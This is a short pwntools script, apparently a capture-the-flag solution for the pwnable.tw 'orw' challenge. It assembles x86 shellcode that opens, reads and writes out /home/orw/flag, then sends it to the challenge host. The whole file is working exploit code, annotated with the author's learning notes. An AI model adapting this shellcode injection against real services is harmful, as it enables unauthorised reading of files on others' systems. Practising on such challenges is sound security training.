from pwn import *

r = remote("chall.pwnable.tw", 10001) 

# ///home/orw/flag
shellcode = asm("push 0x00") # Why need push 0x00? -> Add null terminator ('\0') 
shellcode += asm("push 0x67616c66") 
shellcode += asm("push 0x2f77726f")
shellcode += asm("push 0x2f656d6f")
shellcode += asm("push 0x682f2f2f")

# https://www.tutorialspoint.com/assembly_programming/assembly_file_management.htm
# open
shellcode += asm("mov eax, 0x5")
shellcode += asm("mov ebx, esp")
shellcode += asm("mov ecx, 0") # read-only (0), write-only (1), and read-write (2)
shellcode += asm("mov edx, 0")
shellcode += asm("int 0x80")

# read
# I don't know why I swapped 22 and 23 line, I still may get the flag
shellcode += asm("mov ebx, eax")
shellcode += asm("mov eax, 0x3")
shellcode += asm("mov ecx, esi")
shellcode += asm("mov edx, 0xff")
shellcode += asm("int 0x80")

# write
shellcode += asm("mov edx, eax")
shellcode += asm("mov eax, 0x4")
shellcode += asm("mov ebx, 0x1")
shellcode += asm("mov ecx, esi")

shellcode += asm("int 0x80")

# print(shellcode)
r.sendline(shellcode)

r.interactive()
